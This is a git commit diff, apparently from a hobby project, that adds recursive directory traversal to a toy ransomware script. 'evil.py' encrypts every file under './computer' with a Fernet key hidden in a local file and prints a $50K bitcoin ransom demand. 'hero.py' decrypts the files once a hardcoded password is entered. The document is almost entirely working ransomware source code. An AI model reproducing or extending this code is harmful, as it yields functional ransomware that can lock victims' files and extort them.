4e1f9f0c57bc344960892a8b6ba09bae1e907e97
NoobGrinder420 <d1h2a3n4v5i6n@gmail.com>
2025-03-14 18:53:22 +0800

    added recursive capabilities

--- evil.py
+++ evil.py
@@ -3,34 +3,42 @@
 import os
 from cryptography.fernet import Fernet
 
-files = []
+folder = "./computer"
 
-print("retreiving files...")
 
-for file in os.listdir():
-	if file == "evil.py" or file == ".hiddenkey.key" or file == "hero.py":
-		continue
-	if os.path.isfile(file):
-		files.append(file)
+def file_picker(folder):
+    files = []
+
+    for file in os.listdir(folder):
+        file_path = os.path.join(folder, file)
+
+        if os.path.isfile(file_path):
+            files.append(file_path)
+
+        elif os.path.isdir(file_path):
+            files.extend(file_picker(file_path))
+
+    return files
+
+
+print("retrieving files...")
+files = file_picker(folder)
 
 print("generating key...")
 key = Fernet.generate_key()
 
 print("hiding key...")
 with open(".hiddenkey.key", "wb") as fout:
-	fout.write(key)
+    fout.write(key)
 
 print("encrypting files...")
-
 for file in files:
-	with open(file, "rb") as fin:
-		content = fin.read()
+    with open(file, "rb") as fin:
+        content = fin.read()
 
-	encrypted_content = Fernet(key).encrypt(content) #returns bytestring
+    encrypted_content = Fernet(key).encrypt(content)  # returns bytestring
 
-	with open(file, "wb") as fout:
-		fout.write(encrypted_content)
+    with open(file, "wb") as fout:
+        fout.write(encrypted_content)
 
-
-print("files locked, send $50K in bitcoin to NoobGrinder420!!") 
-
+print("files locked, send $50K in bitcoin to NoobGrinder420!!")
--- hero.py
+++ hero.py
@@ -3,44 +3,65 @@
 import os
 from cryptography.fernet import Fernet
 
-files = []
+folder = "./computer"
 
-print("retreiving files...")
 
-for file in os.listdir():
-	if file == "evil.py" or file == ".hiddenkey.key" or file == "hero.py":
-		continue
-	if os.path.isfile(file):
-		files.append(file)
+def file_picker(folder):
+    files = []
 
-print("taking in a fake key that is not useful whatsoever")
-fake_key = input(
-'''
-Please enter decryption key
+    for file in os.listdir(folder):
+        file_path = os.path.join(folder, file)
 
-pay $50k in bitcoin to 
-NoobGrinder420@bitcoin
-if you do not have the key 
+        if os.path.isfile(file_path):
+            files.append(file_path)
+
+        elif os.path.isdir(file_path):
+            files.extend(file_picker(file_path))
+
+    return files
+
+
+print("retrieving files...")
+files = file_picker(folder)
+
+print("Taking in a decryption key")
+user_pwd = input(
+    '''
+Please enter password:
+
+If you do not have the password, pay $50k 
+in bitcoin to NoobGrinder420@bitcoin
 
 (or find .hiddenkey.key)
 '''
-	)
+)
 
-with open(".hiddenkey.key", "rb") as fin:
-	key = fin.read()
+try:
+    print("retrieving hidden key...")
+    with open(".hiddenkey.key", "rb") as fin:
+        key = fin.read()
 
+    if user_pwd != "sigma":
+        print("Invalid password! Files remain locked.")
+        exit(1)
 
-print("decrypting files...")
+    print("decrypting files...")
+    for file in files:
+        with open(file, "rb") as fin:
+            content = fin.read()
 
-for file in files:
-	with open(file, "rb") as fin:
-		content = fin.read()
+        decrypted_content = Fernet(key).decrypt(content)
 
-	decrypted_content = Fernet(key).decrypt(content) #returns bytestring
+        with open(file, "wb") as fout:
+            fout.write(decrypted_content)
 
-	with open(file, "wb") as fout:
-		fout.write(decrypted_content)
+    print("files unlocked successfully!")
 
+except FileNotFoundError:
+    print(".hiddenkey.key not found! Decryption failed.")
+    exit(1)
 
-print("files unlocked!! thanks for the 50k") 
+except Exception as e:
+    print(f"an error occurred: {e}")
+    exit(1)
 
